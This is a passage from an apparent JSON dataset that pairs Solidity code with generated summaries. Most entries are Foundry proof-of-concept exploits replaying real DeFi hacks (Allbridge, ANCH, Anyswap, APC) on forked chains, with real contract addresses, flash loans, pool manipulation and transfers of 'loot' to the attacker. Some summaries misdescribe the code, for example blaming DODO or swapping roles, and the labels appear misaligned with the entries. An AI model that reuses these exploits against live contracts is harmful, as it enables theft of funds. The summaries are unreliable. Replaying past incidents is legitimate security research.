akutarNft.processRefunds(){\n        } catch Error(string memory Exception) {\n            console.log(\"processRefunds() REVERT : \", Exception);\n        }\n        //Since the honestUser's bid was after maliciousUser's bid, the bid amount of the honestUser is never returned due to the revert Exception\n        console.log(\"honestUser Balance post processRefunds: \", honestUser.balance / 1 ether);\n    }\n\n    function testclaimProjectFunds() public {\n        address ownerOfAkutarNFT = 0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9;\n\n        //Set the block.height to the time when the auction was over and claimProjectFunds() can be invoked\n        cheats.warp(1650672435);\n        \n        cheats.prank(ownerOfAkutarNFT);\n        try akutarNft.claimProjectFunds(){\n        } catch Error(string memory Exception) {\n            console.log(\"claimProjectFunds() ERROR : \", Exception);\n        }\n    }\n\n    fallback() external { \n        revert(\"CAUSE REVERT !!!\");\n     }\n}",
        "summary": "This is a contract named AkutarNFTExploit and its purpose is to demonstrate two serious logic vulnerabilities in the AkutarNFT project, by showing how it can be exploited to execute a denial of service (DoS) attack and lock away a project fund. The first vulnerability is that there is no check to ensure that the bidder is not a contract, allowing the attacker to call the `revert()` function and disrupt normal bidders, causing their bid amount being stuck. The second vulnerability involves an incorrect check in the `require` statement which can lock the project fund (worth more than 34M USD) forever. The contract has two functions to test these vulnerabilities, `testDOSAttack()` and `testclaimProjectFunds()`. The contract uses imported code from the `forge-std/Test.sol` and `interface.sol` files.",
        "id": "ad9f2243-21d1-4a50-9f65-fe288c9b9975",
        "api_seq": "AlarmTrigger"
    },
    {
        "code": "pragma solidity ^0.5.0;\n\ninterface AlarmWakeUp {\n    function callback(bytes calldata _data) external;\n}\n\ncontract AlarmService {\n    \n    struct TimeEvent {\n        address addr;\n        bytes data;\n    }\n    \n    mapping(uint => TimeEvent[]) private _events;\n    \n    function set(uint _time) \n        public \n        returns (bool) {\n        TimeEvent memory _timeEvent;\n        _timeEvent.addr = msg.sender;\n        _timeEvent.data = msg.data;\n        _events[_time].push(_timeEvent);\n    }\n    \n    function call(uint _time) \n        public {\n        TimeEvent[] memory timeEvents = _events[_time];\n        for(uint i = 0; i < timeEvents.length; i++) {\n            AlarmWakeUp(timeEvents[i].addr).callback(timeEvents[i].data);\n        }\n    }\n}\n\ncontract AlarmTrigger is AlarmWakeUp {\n    \n    AlarmService private _alarmService;\n    \n    constructor() public {\n        _alarmService = new AlarmService();\n    }\n    \n    function callback(bytes memory _data) \n        public {\n        // Do something\n    }\n    \n    function setAlarm() \n        public {\n        _alarmService.set(block.timestamp+60);\n    }\n    \n}",
        "summary": "This code consists of two contracts, `AlarmService` and `AlarmTrigger`. `AlarmService` is an interface for a third contract called `AlarmWakeUp`. The `AlarmService` contract has a mapping that stores time-stamped events as key-value pairs. An event is stored as a struct data type containing an address and data. The `set()` function allows users to add an event to the mapping with a specific time-stamp. The `call()` function iterates through the events mapped to a particular time-stamp and executes the callback function of each event's contract using the `AlarmWakeUp` interface.\n\n`AlarmTrigger` implements the `AlarmWakeUp` interface and has an instance of the `AlarmService` contract. The `callback()` function is called by the `AlarmService` contract when its `call()` function is triggered. The `setAlarm()` function in the `AlarmTrigger` contract adds an event to the `AlarmService` mapping with a time-stamp set 60 seconds from the current block's timestamp.",
        "id": "1e7e2100-631f-4aab-a7b3-e91433a7f9f5",
        "api_seq": "Allbridge_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1642372700726505473\n// @Tx\n// https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210\n\ninterface IPool{\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 minimumToAmount,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 actualToAmount, uint256 haircut);\n\n    function deposit(uint256 amount) external;\n}\n\ninterface IPool2{\n    function deposit(uint256 amount) external;\n    function withdraw(uint256 amountLp) external;\n}\n\ninterface IBridge{\n    function swap(\n        uint256 amount, \n        bytes32 token, \n        bytes32 receiveToken, \n        address recipient) \n        external ;\n}\n\ncontract ContractTest is Test {\n\n    function setUp() external {\n        vm.createSelectFork(\"bsc\", 26982067);\n    }\n\n    function test_exploit() external {\n        Exploit exploit = new Exploit();\n        exploit.run();\n    }\n}\n\ncontract Exploit{\n\n    IPancakePair pancakeSwap = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IPool pool_0x312B = IPool(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);\n    IPool2 pool_0x179a = IPool2(0x179aaD597399B9ae078acFE2B746C09117799ca0);\n    IPool2 pool_0xb19c = IPool2(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);\n    IBridge bridge = IBridge(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);\n\n    function run() external {\n\n        console.log(\"hacker BUSD bal before attack is       \", BUSD.balanceOf(tx.origin));\n        \n        // The attacker flashloans $7.5M of BUSD\n        pancakeSwap.swap(\n            0,\n            7_500_000e18,\n            address(this),\n            \"Gimme da loot\" \n            );\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n\n        // Swaps $2M BUSD for $2M $BSC-USD in pool_0x312B\n        BUSD.approve(address(pool_0x312B), type(uint).max);\n        BSC_USD.approve(address(pool_0x312B), type(uint).max);\n\n        pool_0x312B.swap(\n            address(BUSD), \n            address(BSC_USD),\n            2_003_300e18,\n            1,\n            address(this),\n            block.timestamp + 100 seconds \n            );\n        \n        // Then deposits $5M BUSD into pool 0x179a\n        BUSD.approve(address(pool_0x179a), type(uint).max);\n        pool_0x179a.deposit(5_000_000e18);\n\n        // Swap BUSD to BSC_USD\n        pool_0x312B.swap(\n            address(BUSD),\n            address(BSC_USD),\n            496_700e18,\n            1,\n            address(this),\n            block.timestamp + 100 seconds\n            );\n        \n        // Deposit $2 mil into pool_0xb19c\n        BSC_USD.approve(address(pool_0xb19c), type(uint).max);\n        pool_0xb19c.deposit(2_000_000e18);\n\n        /*\n         The attacker then swaps $500K BSC-USD for $BUSD \n        in Allbridge's Bridge contract, resulting in a high \n        dividend for the previous liquidity deposit.\n        */ \n\n        bytes32 bsc_usd = 0x00000000000000000000000055d398326f99059ff775485246999027b3197955;\n        bytes32 busd = 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56; \n\n        uint BSC_USD_bal = BSC_USD.balanceOf(address(this));\n        bridge.swap(\n            BSC_USD_bal,\n            bsc_usd,\n            busd,\n            address(this)\n        );\n\n        /*\n         The BUSD liquidity in 0x179a is then removed, \n        at which point the liquidity balance within \n        the 0x179a pool is broken.\n        */\n\n        pool_0x179a.withdraw(4830262616);\n\n        /*\n         The attacker was then able to swap out $790,000 \n        of BSC-USD from Bridge using only $40,000 of BUSD.\n        */\n        \n        bridge.swap(\n            40_000e18,\n            busd,\n            bsc_usd,\n            address(this)\n        );\n\n        // Withdraw from pool_0xb19c\n        pool_0xb19c.withdraw(1993728530);\n\n        // Swap BSC_USD to BUSD in pool_0x312B\n        BSC_USD_bal = BSC_USD.balanceOf(address(this));\n        pool_0x312B.swap(\n            address(BSC_USD),\n            address(BUSD),\n            BSC_USD_bal,\n            1,\n            address(this),\n            block.timestamp + 100 seconds\n            );\n\n        // Repay flashloan\n        BUSD.transfer(\n            address(pancakeSwap), \n            7_522_500e18\n            );\n\n        // Transfer loot to attacker\n        BUSD.transfer(\n            tx.origin,\n            BUSD.balanceOf(address(this))\n            );\n\n        console.log(\"hacker BUSD bal after attack is        \", BUSD.balanceOf(tx.origin));  \n    }\n\n}\n",
        "summary": "The code is a Solidity contract that performs a flash loan attack on the PancakeSwap exchange. The attack uses multiple other smart contracts, including IPool, IPool2, IBridge, and IERC20 to perform a series of swaps and deposits of BUSD and BSC-USD tokens, resulting in a high dividend payout. The attack then withdraws BUSD liquidity from a specific pool, breaking the liquidity balance in the pool and allowing the attacker to swap out BSC-USD tokens for a significant profit using very little BUSD. Finally, the contract repays the flash loan, transferring the stolen funds to the attacker's wallet.",
        "id": "0492cd4e-79d4-4d15-86d2-857c3fa27ce4",
        "api_seq": "Allbridge_exp2"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1642356701100916736\n// https://twitter.com/BeosinAlert/status/1642372700726505473\n// @TX\n// https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210\n// @Summary\n// https://twitter.com/gbaleeeee/status/1642520517788966915\n\ninterface IBridgeSwap {\n    function swap(uint256 amount, bytes32 token, bytes32 receiveToken, address recipient) external;\n}\n\ninterface ISwap {\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 minimumToAmount,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface AllBridgePool {\n    function tokenBalance() external view returns (uint256);\n    function vUsdBalance() external view returns (uint256);\n    function deposit(uint256 amount) external;\n    function withdraw(uint256 amountLp) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IBridgeSwap BridgeSwap = IBridgeSwap(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);\n    ISwap Swap = ISwap(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);\n    AllBridgePool USDTPool = AllBridgePool(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);\n    AllBridgePool BUSDPool = AllBridgePool(0x179aaD597399B9ae078acFE2B746C09117799ca0);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_982_067);\n        cheats.label(address(BUSD), \"BUSD\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(BridgeSwap), \"BridgeSwap\");\n        cheats.label(address(Swap), \"Swap\");\n        cheats.label(address(USDTPool), \"USDTPool\");\n        cheats.label(address(BUSDPool), \"BUSDPool\");\n        cheats.label(address(Pair), \"Pair\");\n    }\n\n    function testExploit() public {\n        Pair.swap(0, 7_500_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance after exploit\", BUSD.balanceOf(address(this)), BUSD.decimals()\n            );\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        BUSD.approve(address(Swap), type(uint256).max);\n        USDT.approve(address(Swap), type(uint256).max);\n        BUSD.approve(address(BUSDPool), type(uint256).max);\n        USDT.approve(address(USDTPool), type(uint256).max);\n        Swap.swap(address(BUSD), address(USDT), 2_003_300 * 1e18, 1, address(this), block.timestamp);\n        BUSDPool.deposit(5_000_000 * 1e18); // deposit BUSD to BUSDPool\n        Swap.swap(address(BUSD), address(USDT), 496_700 * 1e18, 1, address(this), block.timestamp);\n        USDTPool.deposit(2_000_000 * 1e18); // deposit USDT to USDTPool\n\n        console.log(\n            \"BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:\",\n            BUSDPool.tokenBalance(),\n            BUSDPool.vUsdBalance(),\n            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()\n        );\n        bytes32 token = bytes32(uint256(uint160(address(USDT))));\n        bytes32 receiveToken = bytes32(uint256(uint160(address(BUSD))));\n        BridgeSwap.swap(USDT.balanceOf(address(this)), token, receiveToken, address(this)); // BridgeSwap USDT to BUSD\n        console.log(\n            \"BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:\",\n            BUSDPool.tokenBalance(),\n            BUSDPool.vUsdBalance(),\n            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()\n        );\n\n        BUSDPool.withdraw(4_830_262_616); // Amplify the imbalance of vUSDbalance and tokenbalance in BUSDPool\n        console.log(\n            \"BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:\",\n            BUSDPool.tokenBalance(),\n            BUSDPool.vUsdBalance(),\n            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()\n        );\n\n        BridgeSwap.swap(40_000 * 1e18, receiveToken, token, address(this)); // BridgeSwap BUSD to USDT\n        console.log(\n            \"BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:\",\n            BUSDPool.tokenBalance(),\n            BUSDPool.vUsdBalance(),\n            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()\n        );\n        USDTPool.withdraw(1_993_728_530);\n\n        Swap.swap(address(USDT), address(BUSD), USDT.balanceOf(address(this)), 1, address(this), block.timestamp);\n        BUSD.transfer(address(Pair), 7_522_500 * 1e18);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that performs several actions for testing purposes. It imports several interfaces and contracts, including a bridge swap interface, a swap interface, a bridge pool interface, and a Uniswap pairing contract interface. \n\nThe contract defines a function called `testExploit` which is for testing a specific exploit scenario. The `pancakeCall` function is triggered when a `Pair` event is fired. This function performs a sequence of actions, including approving token transactions, swapping BUSD and USDT tokens, depositing BUSD and USDT into their respective pools, swapping USDT to BUSD, withdrawing from the BUSD pool, swapping BUSD back to USDT, withdrawing from the USDT pool, and transferring 7,522,500 BUSD to the specified `Pair` address. \n\nThe `setUp` function defines and labels several addresses for testing purposes. Finally, the contract is marked with SPDX license identifier and a minimum Solidity version.",
        "id": "41007b3a-ba9b-49ee-8b93-94dd86d7e2e5",
        "api_seq": "Alphabet"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ninterface Letter {\n    function n() public returns (uint);\n}\n\ncontract A is Letter {\n    function n()\n        public\n        returns (uint) {\n        return 1;    \n    }\n}\n\ncontract B is A {}\n\ncontract C is Letter {\n    function n()\n        public\n        returns (uint) {\n        return 2;\n    }\n    \n    function x() \n        public\n        returns (string) {\n        return \"x\";        \n    }\n}\n\ncontract Alphabet {\n    \n    Letter[] private letters;\n    \n    event Printer(uint);\n    \n    function Alphabet()\n        public {\n        letters.push(new A());\n        letters.push(new B());\n        letters.push(new C());\n    }\n    \n    function loadRemote(address _addrX,\n                        address _addrY,\n                        address _addrZ)\n        public {\n        letters.push(Letter(_addrX));\n        letters.push(Letter(_addrY));\n        letters.push(Letter(_addrZ));    \n    }\n    \n    function printLetters()\n        public {\n        for(uint i = 0; i < letters.length; i++) {\n            Printer(letters[i].n());\n        }    \n    }\n}",
        "summary": "This code defines an interface called Letter which has a single function called `n()`. The function returns an unsigned integer value.\n\nThe alphabet contract implements the Letter interface. It also has three contracts named A, B and C which inherit from Letter.\n\nThe Alphabet contract has an array named `letters` which stores instances of contracts that implement the Letter interface. It also has an event called Printer which emits an unsigned integer value. \n\nThe Alphabet contract has a function called `loadRemote` which takes three arguments which are addresses of contracts that implement the Letter interface. These contracts are cast as the Letter interface using the `Letter(_addrX)` syntax and then pushed into the `letters` array.\n\nThe Alphabet contract has a function called `printLetters` which iterates over all the elements of the `letters` array and emits the output of the `n()` function of each element using the `Printer` event.",
        "id": "0b886051-5b9a-4e6c-bbce-18c523d349e6",
        "api_seq": "ANCH_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1557846766682140672\n// @Contract address\n// https://bscscan.com/address/0xa4f5d4afd6b9226b3004dd276a9f778eb75f2e9e#code\n\ncontract ContractTest is DSTest{\n    IERC20 ANCH = IERC20(0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address dodo = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 20302534);\n    }\n\n    function testExploit() public{\n        USDT.approve(address(Router), type(uint).max);\n        ANCH.approve(address(Router), type(uint).max);\n        DVM(dodo).flashLoan(0, 50_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        // get ANCH\n        buyANCH();\n        // call skim to add ANCH amount\n        ANCH.transfer(address(Pair), ANCH.balanceOf(address(this)));\n        for (uint index = 0; index < 60; index++) {\n            Pair.skim(address(Pair));            \n        }\n        Pair.skim(address(this));\n        // sell ANCH\n        sellANCH();\n        USDT.transfer(dodo, 50_000 * 1e18);\n    }\n\n    function buyANCH() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(ANCH);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            USDT.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function sellANCH() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(ANCH);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            ANCH.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}",
        "summary": "This code is a Solidity smart contract that interacts with other smart contracts to perform a flash loan attack on the DODO decentralized exchange on the Binance Smart Chain. The attack involves borrowing a large amount of USDT, using it to buy a large amount of ANCH tokens, adding those tokens to a liquidity pool, and then quickly withdrawing the USDT before the price of ANCH drops. This is done by using a fork of the BSC blockchain created with CheatCodes. The code imports external contracts for ERC-20 tokens, the DODO exchange, and the Uniswap V2 router and liquidity pair contracts. The main function of the contract is the `testExploit()` function, which executes the attack. The `setUp()` function is called to specify the fork to be used for the attack.",
        "id": "17f18529-8407-4545-9f54-87b924f23ccb",
        "api_seq": "Annex_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1593690338526273536\n// @TX\n// https://bscscan.com/tx/0x3757d177482171dcfad7066c5e88d6f0f0fe74b28f32e41dd77137cad859c777\n\ncontract ContractTest is DSTest{\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    IUniswapV2Factory Factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);\n    address Token;\n    uint256 WBNBAmount;\n    address Pair;\n    address constant dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;\n    address constant Liquidator = 0xe65E970F065643bA80E5822edfF483A1d75263E3;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23165446);\n    }\n\n    function testExploit() public{\n        MyERC20 MyToken = new MyERC20();\n        Token = address(MyToken);\n        MyToken.mint(1_0 * 1e18);\n        DVM(dodo).flashLoan(8 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        IERC20(Token).approve(address(Router), type(uint).max);\n        WBNB.approve(address(Router), type(uint).max);\n        Router.addLiquidity(\n            address(Token),\n            address(WBNB),\n            8 * 1e18,\n            8 * 1e18,\n            0,\n            0,\n            address(this),\n            block.timestamp + 60\n        );\n        Pair = Factory.getPair(Token, address(WBNB));\n        WBNBAmount = WBNB.balanceOf(Liquidator);\n        bytes memory data1 = abi.encode(address(this), address(this), address(this));\n        if(Uni_Pair_V2(Pair).token0() == address(WBNB)){\n            Uni_Pair_V2(Pair).swap(WBNBAmount, 0, Liquidator, data1);\n        }else{\n            Uni_Pair_V2(Pair).swap(0, WBNBAmount, Liquidator, data1);\n        }\n        Uni_Pair_V2(Pair).approve(address(Router), type(uint).max);\n        Router.removeLiquidity(\n            address(Token),\n            address(WBNB),\n            Uni_Pair_V2(Pair).balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp + 60\n        );\n        WBNB.transferFrom(Liquidator, address(this), WBNB.balanceOf(Liquidator));\n        WBNB.transfer(dodo, 8 * 1e18);\n    }\n    \n    \n\n    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint){\n        return 0;\n    }\n    function balanceOf(address account) external returns (uint){\n        return 0;\n    }\n    function redeem(uint256 redeemTokens) external returns (uint){\n        return 0;\n    }\n}\n\n\ncontract MyERC20 {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"Shit Coin\";\n    string public symbol = \"Shit\";\n    uint8 public decimals = 18;\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
        "summary": "This code defines a Solidity smart contract that can be used to exploit a vulnerability in the DODO decentralized exchange on the Binance Smart Chain. When executed, the `testExploit()` function will create a new ERC20 token called \"Shit Coin\" and mint 10 tokens. It will then use a flash loan from the DODO exchange to add liquidity to the Shit Coin/Binance Coin (BNB) trading pair and perform a swap that results in the attacker receiving all the BNB in the liquidity pool. Finally, the contract will redeem the flash loan and send the stolen BNB to the attacker's address on the DODO exchange. The `MyERC20` contract is a simple implementation of an ERC20 token for testing purposes.",
        "id": "d6455eb7-8e00-4167-915e-80d9ccbefccb",
        "api_seq": "Anyswap_poc.t"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    AnyswapV4Router any  = AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);\n    AnyswapV1ERC20 any20 =AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);\n    WETH  weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 14037236); // fork mainnet block number 14037236\n    }\n\n    function testExample() public {\n       //https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7\n        //    anySwapOutUnderlyingWithPermit(\n        //     address from,\n        //     address token,\n        //     address to,\n        //     uint amount,\n        //     uint deadline,\n        //     uint8 v,\n        //     bytes32 r,\n        //     bytes32 s,\n        //     uint toChainID\n        //   )\n      any.anySwapOutUnderlyingWithPermit(0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB,address(this),msg.sender,308636644758370382903,100000000000000000000,0,\"0x\",\"0x\",56);\n      emit log_named_uint(\"Before exploit, WETH balance of attacker:\", weth.balanceOf(msg.sender));\n      weth.transfer(msg.sender, 308636644758370382901);\n      //uint sender = weth.balanceOf(msg.sender);\n      emit log_named_uint(\"After exploit, WETH balance of attacker:\", weth.balanceOf(msg.sender));\n}\n\n    function burn(address from, uint256 amount) external returns (bool){\n        amount;\n        from;\n        return true;\n    }\n\n    function depositVault(uint amount, address to) external returns (uint){\n        amount;\n        to;\n        return 1;\n    }\n\n     function underlying() external view returns (address){\n        return WETH_Address;\n        \n    }\n}\n",
        "summary": "This code is a Solidity smart contract that tests a function called `anySwapOutUnderlyingWithPermit` from the AnyswapV4Router contract. It sets up some initial variables and values, and defines a test function that calls the function being tested. It also includes some additional functions (`burn`, `depositVault`, and `underlying`) that don't appear to be directly related to the test. The main purpose of the test function is to check that the WETH balance of a specified address is updated correctly after calling the `anySwapOutUnderlyingWithPermit` function from the AnyswapV4Router contract. The `emit` keyword is used to log information during the test. The code also imports other contracts such as `Test.sol` and `interface.sol`.",
        "id": "66a53201-ed94-4a29-849f-52adfcc4dbd3",
        "api_seq": "APC_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1598262002010378241\n// @TX\n// https://bscscan.com/tx/0xbcaecea2044101c80f186ce5327bec796cd9e054f0c240ddce93e2aead337370 first attack\n// https://bscscan.com/tx/0xf2d4559aeb945fb8e4304da5320ce6a2a96415aa70286715c9fcaf5dbd9d7ed2 second attack\n\ninterface TransparentUpgradeableProxy{\n    function swap(address a1, address a2, uint256 amount) external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 APC = IERC20(0x2AA504586d6CaB3C59Fa629f74c586d78b93A025);\n    IERC20 MUSD = IERC20(0x473C33C55bE10bB53D81fe45173fcc444143a13e);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    TransparentUpgradeableProxy transSwap = TransparentUpgradeableProxy(0x5a88114F02bfFb04a9A13a776f592547B3080237);\n    address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23527906);\n    }\n\n    function testExploit() public{\n        APC.approve(address(Router), type(uint).max);\n        APC.approve(address(transSwap), type(uint).max);\n        USDT.approve(address(Router), type(uint).max);\n        MUSD.approve(address(transSwap), type(uint).max);\n        DVM(dodo).flashLoan(0, 500_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{\n        USDTToAPC(); // Pump APC token price\n        transSwap.swap(address(APC), address(MUSD), 100_000 * 1e18); // APC swap to MUSD with incorrect price, get more MUSD\n        APCToUSDT(); // Dump APC token price\n        transSwap.swap(address(MUSD), address(APC), MUSD.balanceOf(address(this))); // MUSD swap to APC with normal price\n        APCToUSDT(); // sell the obtained of APC\n        USDT.transfer(dodo, 500_000 * 1e18);\n    }\n\n    function USDTToAPC() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(APC);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            USDT.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function APCToUSDT() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(APC);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            APC.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n\n}",
        "summary": "This code is a Solidity smart contract that exploits a vulnerability in the DODO decentralized exchange (DEX) on the Binance Smart Chain. The contract uses a flash loan to manipulate the price of tokens traded on the DODO platform, and swap tokens to gain a profit. The contract also interacts with other smart contracts, such as the Uniswap Router and a TransparentUpgradeableProxy, to complete its functions. The code includes commentary explaining the purpose of each function and referencing specific transactions on the blockchain used in the exploitation.",
        "id": "6bd86617-180b-4eb0-91dd-bed8d352649b",
        "api_seq": "AppealStorage"
    },
    {
